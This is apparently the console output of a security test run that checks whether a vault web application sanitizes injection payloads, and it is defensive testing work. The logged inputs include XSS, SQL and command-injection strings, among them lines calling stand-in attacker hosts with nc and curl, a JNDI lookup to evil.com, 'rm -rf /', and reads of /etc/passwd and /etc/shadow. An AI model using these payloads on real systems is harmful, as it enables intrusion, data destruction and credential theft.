🧪 Testing Injection Attack Prevention

======================================================================

📋 Setup Phase
----------------------------------------------------------------------
✅ Register user
Setup Failed: Get CSRF failed 200 {
  'x-powered-by': 'Express',
  'access-control-allow-origin': '*',
  'content-type': 'application/json; charset=utf-8',
  'content-length': '85',
  etag: 'W/"55-0PkgW4UHiEFvW21UXlEp6aFgZ1o"',
  date: 'Thu, 20 Nov 2025 08:52:30 GMT',
  connection: 'keep-alive',
  'keep-alive': 'timeout=5'
}
❌ Get CSRF token and create vault

🔴 Test 1: XSS Attack Prevention
----------------------------------------------------------------------
✅ Sanitize XSS payload in username: <script>alert("XSS")</script>...
✅ Sanitize XSS payload in vault name: <script>alert("XSS")</script>...
✅ Sanitize XSS payload in item name: <script>alert("XSS")</script>...
✅ Sanitize XSS payload in description: <script>alert("XSS")</script>...
✅ Sanitize XSS payload in username: <img src=x onerror=alert("XSS"...
✅ Sanitize XSS payload in vault name: <img src=x onerror=alert("XSS"...
✅ Sanitize XSS payload in item name: <img src=x onerror=alert("XSS"...
✅ Sanitize XSS payload in description: <img src=x onerror=alert("XSS"...
✅ Sanitize XSS payload in username: <svg onload=alert("XSS")>...
✅ Sanitize XSS payload in vault name: <svg onload=alert("XSS")>...
✅ Sanitize XSS payload in item name: <svg onload=alert("XSS")>...
✅ Sanitize XSS payload in description: <svg onload=alert("XSS")>...
✅ Sanitize XSS payload in username: javascript:alert("XSS")...
✅ Sanitize XSS payload in vault name: javascript:alert("XSS")...
✅ Sanitize XSS payload in item name: javascript:alert("XSS")...
✅ Sanitize XSS payload in description: javascript:alert("XSS")...
✅ Sanitize XSS payload in username: <iframe src="javascript:alert(...
✅ Sanitize XSS payload in vault name: <iframe src="javascript:alert(...
✅ Sanitize XSS payload in item name: <iframe src="javascript:alert(...
✅ Sanitize XSS payload in description: <iframe src="javascript:alert(...
✅ Sanitize XSS payload in username: <body onload=alert("XSS")>...
✅ Sanitize XSS payload in vault name: <body onload=alert("XSS")>...
✅ Sanitize XSS payload in item name: <body onload=alert("XSS")>...
✅ Sanitize XSS payload in description: <body onload=alert("XSS")>...
✅ Sanitize XSS payload in username: <input onfocus=alert("XSS") au...
✅ Sanitize XSS payload in vault name: <input onfocus=alert("XSS") au...
✅ Sanitize XSS payload in item name: <input onfocus=alert("XSS") au...
✅ Sanitize XSS payload in description: <input onfocus=alert("XSS") au...
✅ Sanitize XSS payload in username: <select onfocus=alert("XSS") a...
✅ Sanitize XSS payload in vault name: <select onfocus=alert("XSS") a...
✅ Sanitize XSS payload in item name: <select onfocus=alert("XSS") a...
✅ Sanitize XSS payload in description: <select onfocus=alert("XSS") a...
✅ Sanitize XSS payload in username: <textarea onfocus=alert("XSS")...
✅ Sanitize XSS payload in vault name: <textarea onfocus=alert("XSS")...
✅ Sanitize XSS payload in item name: <textarea onfocus=alert("XSS")...
✅ Sanitize XSS payload in description: <textarea onfocus=alert("XSS")...
✅ Sanitize XSS payload in username: <keygen onfocus=alert("XSS") a...
✅ Sanitize XSS payload in vault name: <keygen onfocus=alert("XSS") a...
✅ Sanitize XSS payload in item name: <keygen onfocus=alert("XSS") a...
✅ Sanitize XSS payload in description: <keygen onfocus=alert("XSS") a...
✅ Sanitize XSS payload in username: <video><source onerror="alert(...
✅ Sanitize XSS payload in vault name: <video><source onerror="alert(...
✅ Sanitize XSS payload in item name: <video><source onerror="alert(...
✅ Sanitize XSS payload in description: <video><source onerror="alert(...
✅ Sanitize XSS payload in username: <audio src=x onerror=alert("XS...
✅ Sanitize XSS payload in vault name: <audio src=x onerror=alert("XS...
✅ Sanitize XSS payload in item name: <audio src=x onerror=alert("XS...
✅ Sanitize XSS payload in description: <audio src=x onerror=alert("XS...
✅ Sanitize XSS payload in username: <details open ontoggle=alert("...
✅ Sanitize XSS payload in vault name: <details open ontoggle=alert("...
✅ Sanitize XSS payload in item name: <details open ontoggle=alert("...
✅ Sanitize XSS payload in description: <details open ontoggle=alert("...
✅ Sanitize XSS payload in username: <marquee onstart=alert("XSS")>...
✅ Sanitize XSS payload in vault name: <marquee onstart=alert("XSS")>...
✅ Sanitize XSS payload in item name: <marquee onstart=alert("XSS")>...
✅ Sanitize XSS payload in description: <marquee onstart=alert("XSS")>...
✅ Sanitize XSS payload in username: <div onmouseover=alert("XSS")>...
✅ Sanitize XSS payload in vault name: <div onmouseover=alert("XSS")>...
✅ Sanitize XSS payload in item name: <div onmouseover=alert("XSS")>...
✅ Sanitize XSS payload in description: <div onmouseover=alert("XSS")>...
✅ Sanitize XSS payload in username: "><script>alert("XSS")</script...
✅ Sanitize XSS payload in vault name: "><script>alert("XSS")</script...
✅ Sanitize XSS payload in item name: "><script>alert("XSS")</script...
✅ Sanitize XSS payload in description: "><script>alert("XSS")</script...
✅ Sanitize XSS payload in username: '><script>alert("XSS")</script...
✅ Sanitize XSS payload in vault name: '><script>alert("XSS")</script...
✅ Sanitize XSS payload in item name: '><script>alert("XSS")</script...
✅ Sanitize XSS payload in description: '><script>alert("XSS")</script...
✅ Sanitize XSS payload in username: "><img src=x onerror=alert("XS...
✅ Sanitize XSS payload in vault name: "><img src=x onerror=alert("XS...
✅ Sanitize XSS payload in item name: "><img src=x onerror=alert("XS...
✅ Sanitize XSS payload in description: "><img src=x onerror=alert("XS...
✅ Sanitize XSS payload in username: '><img src=x onerror=alert("XS...
✅ Sanitize XSS payload in vault name: '><img src=x onerror=alert("XS...
✅ Sanitize XSS payload in item name: '><img src=x onerror=alert("XS...
✅ Sanitize XSS payload in description: '><img src=x onerror=alert("XS...
✅ Sanitize XSS payload in username: <script>document.cookie</scrip...
✅ Sanitize XSS payload in vault name: <script>document.cookie</scrip...
✅ Sanitize XSS payload in item name: <script>document.cookie</scrip...
✅ Sanitize XSS payload in description: <script>document.cookie</scrip...
✅ Sanitize XSS payload in username: <script>document.location="htt...
✅ Sanitize XSS payload in vault name: <script>document.location="htt...
✅ Sanitize XSS payload in item name: <script>document.location="htt...
✅ Sanitize XSS payload in description: <script>document.location="htt...

🔴 Test 2: SQL Injection Attack Prevention
----------------------------------------------------------------------
✅ Sanitize SQL injection in username: '; DROP TABLE users; --...
✅ Sanitize SQL injection in vault name: '; DROP TABLE users; --...
✅ Sanitize SQL injection in username: ' OR '1'='1...
✅ Sanitize SQL injection in vault name: ' OR '1'='1...
✅ Sanitize SQL injection in username: ' OR 1=1--...
✅ Sanitize SQL injection in vault name: ' OR 1=1--...
✅ Sanitize SQL injection in username: ' UNION SELECT * FROM users--...
✅ Sanitize SQL injection in vault name: ' UNION SELECT * FROM users--...
✅ Sanitize SQL injection in username: '; DELETE FROM vaults; --...
✅ Sanitize SQL injection in vault name: '; DELETE FROM vaults; --...
✅ Sanitize SQL injection in username: ' OR 'a'='a...
✅ Sanitize SQL injection in vault name: ' OR 'a'='a...
✅ Sanitize SQL injection in username: admin'--...
✅ Sanitize SQL injection in vault name: admin'--...
✅ Sanitize SQL injection in username: admin'/*...
✅ Sanitize SQL injection in vault name: admin'/*...
✅ Sanitize SQL injection in username: ' OR 1=1#...
✅ Sanitize SQL injection in vault name: ' OR 1=1#...
✅ Sanitize SQL injection in username: ' UNION SELECT NULL--...
✅ Sanitize SQL injection in vault name: ' UNION SELECT NULL--...
✅ Sanitize SQL injection in username: 1' AND '1'='1...
✅ Sanitize SQL injection in vault name: 1' AND '1'='1...
✅ Sanitize SQL injection in username: 1' AND '1'='2...
✅ Sanitize SQL injection in vault name: 1' AND '1'='2...
✅ Sanitize SQL injection in username: 1' OR '1'='1...
✅ Sanitize SQL injection in vault name: 1' OR '1'='1...
✅ Sanitize SQL injection in username: 1' OR '1'='2...
✅ Sanitize SQL injection in vault name: 1' OR '1'='2...
✅ Sanitize SQL injection in username: 1' OR 1=1--...
✅ Sanitize SQL injection in vault name: 1' OR 1=1--...
✅ Sanitize SQL injection in username: 1' OR 1=1#...
✅ Sanitize SQL injection in vault name: 1' OR 1=1#...
✅ Sanitize SQL injection in username: 1' OR 1=1/*...
✅ Sanitize SQL injection in vault name: 1' OR 1=1/*...
✅ Sanitize SQL injection in username: 1' UNION SELECT NULL--...
✅ Sanitize SQL injection in vault name: 1' UNION SELECT NULL--...
✅ Sanitize SQL injection in username: 1' UNION SELECT NULL#...
✅ Sanitize SQL injection in vault name: 1' UNION SELECT NULL#...
✅ Sanitize SQL injection in username: 1' UNION SELECT NULL/*...
✅ Sanitize SQL injection in vault name: 1' UNION SELECT NULL/*...
✅ Sanitize SQL injection in vault_id parameter
✅ Sanitize SQL injection in item ID parameter

🔴 Test 3: Command Injection / RCE Prevention
----------------------------------------------------------------------
✅ Sanitize command injection in username: ; ls -la...
✅ Sanitize command injection in vault name: ; ls -la...
✅ Sanitize command injection in username: | cat /etc/passwd...
✅ Sanitize command injection in vault name: | cat /etc/passwd...
✅ Sanitize command injection in username: && whoami...
✅ Sanitize command injection in vault name: && whoami...
✅ Sanitize command injection in username: ; rm -rf /...
✅ Sanitize command injection in vault name: ; rm -rf /...
✅ Sanitize command injection in username: `whoami`...
✅ Sanitize command injection in vault name: `whoami`...
✅ Sanitize command injection in username: $(whoami)...
✅ Sanitize command injection in vault name: $(whoami)...
✅ Sanitize command injection in username: ; cat /etc/passwd...
✅ Sanitize command injection in vault name: ; cat /etc/passwd...
✅ Sanitize command injection in username: | nc attacker.com 1234...
✅ Sanitize command injection in vault name: | nc attacker.com 1234...
✅ Sanitize command injection in username: ; curl http://evil.com...
✅ Sanitize command injection in vault name: ; curl http://evil.com...
✅ Sanitize command injection in username: && cat /etc/shadow...
✅ Sanitize command injection in vault name: && cat /etc/shadow...
✅ Sanitize command injection in username: ; python -c "import os; os.sys...
✅ Sanitize command injection in vault name: ; python -c "import os; os.sys...
✅ Sanitize command injection in username: | node -e "require('child_proc...
✅ Sanitize command injection in vault name: | node -e "require('child_proc...
✅ Sanitize command injection in username: ; eval("malicious code")...
✅ Sanitize command injection in vault name: ; eval("malicious code")...
✅ Sanitize command injection in username: | exec("malicious code")...
✅ Sanitize command injection in vault name: | exec("malicious code")...

🔴 Test 4: Path Traversal Prevention
----------------------------------------------------------------------
✅ Sanitize path traversal in username: ../../../etc/passwd...
✅ Sanitize path traversal in vault name: ../../../etc/passwd...
✅ Sanitize path traversal in username: ..\..\..\windows\system32...
✅ Sanitize path traversal in vault name: ..\..\..\windows\system32...
✅ Sanitize path traversal in username: ../../etc/shadow...
✅ Sanitize path traversal in vault name: ../../etc/shadow...
✅ Sanitize path traversal in username: ....//....//etc/passwd...
✅ Sanitize path traversal in vault name: ....//....//etc/passwd...
✅ Sanitize path traversal in username: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc...
✅ Sanitize path traversal in vault name: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc...
✅ Sanitize path traversal in username: ..%2F..%2F..%2Fetc%2Fpasswd...
✅ Sanitize path traversal in vault name: ..%2F..%2F..%2Fetc%2Fpasswd...
✅ Sanitize path traversal in username: ..%5c..%5c..%5cwindows%5csyste...
✅ Sanitize path traversal in vault name: ..%5c..%5c..%5cwindows%5csyste...

🔴 Test 5: LDAP Injection Prevention
----------------------------------------------------------------------
✅ Sanitize LDAP injection in username: *)(&...
✅ Sanitize LDAP injection in username: *))%00...
✅ Sanitize LDAP injection in username: *()|&...
✅ Sanitize LDAP injection in username: admin)(&(password=*))...
✅ Sanitize LDAP injection in username: *)(uid=*))(|(uid=*...

🔴 Test 6: XML/XXE Injection Prevention
----------------------------------------------------------------------
✅ Sanitize XML injection in username: <?xml version="1.0"?><!DOCTYPE...
✅ Sanitize XML injection in username: <?xml version="1.0"?><!DOCTYPE...
✅ Sanitize XML injection in username: <!DOCTYPE foo [<!ENTITY xxe SY...

🔴 Test 7: NoSQL Injection Prevention
----------------------------------------------------------------------
✅ Sanitize NoSQL injection in username: {"$ne": null}...
✅ Sanitize NoSQL injection in username: {"$gt": ""}...
✅ Sanitize NoSQL injection in username: {"$regex": ".*"}...
✅ Sanitize NoSQL injection in username: {"$where": "this.username == t...

🔴 Test 8: Template Injection Prevention
----------------------------------------------------------------------
✅ Sanitize template injection in username: {{7*7}}...
✅ Sanitize template injection in username: ${7*7}...
✅ Sanitize template injection in username: #{7*7}...
✅ Sanitize template injection in username: <%= 7*7 %>...
✅ Sanitize template injection in username: ${jndi:ldap://evil.com/a}...

🔴 Test 9: Null Byte Injection Prevention
----------------------------------------------------------------------
✅ Sanitize null byte in username: test ...
✅ Sanitize null byte in username:  test...
✅ Sanitize null byte in username: test test...
✅ Sanitize null byte in username: test%00...
✅ Sanitize null byte in username: test ...

🔒 Test 10: Output Encoding Verification
----------------------------------------------------------------------
Test 10 Failed: GET items failed 400 { error: 'Invalid vault_id' }
❌ Verify stored data is properly encoded in responses

======================================================================

📊 Test Results: 191 passed, 2 failed

⚠️  Some tests failed. Please review the output above.
⚠️  This indicates potential security vulnerabilities.
